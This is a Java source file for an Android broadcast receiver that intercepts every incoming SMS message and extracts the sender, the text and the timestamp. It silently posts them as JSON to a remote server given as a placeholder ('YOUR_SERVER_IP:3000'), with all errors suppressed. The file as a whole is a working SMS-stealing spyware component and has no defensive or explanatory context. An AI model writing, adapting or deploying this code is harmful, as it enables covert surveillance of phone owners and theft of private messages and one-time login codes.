package com.example.service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONObject;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;

public class SMSReceiver extends BroadcastReceiver {
    private static final String SERVER = "http://YOUR_SERVER_IP:3000";
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
            for (SmsMessage message : messages) {
                try {
                    JSONObject sms = new JSONObject();
                    sms.put("type", "sms");
                    sms.put("from", message.getDisplayOriginatingAddress());
                    sms.put("body", message.getDisplayMessageBody());
                    sms.put("time", message.getTimestampMillis());
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            sendData(sms.toString());
                        }
                    }).start();
                } catch (Exception e) {}
            }
        }
    }
    private void sendData(String json) {
        try {
            URL url = new URL(SERVER);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {}
    }
              }
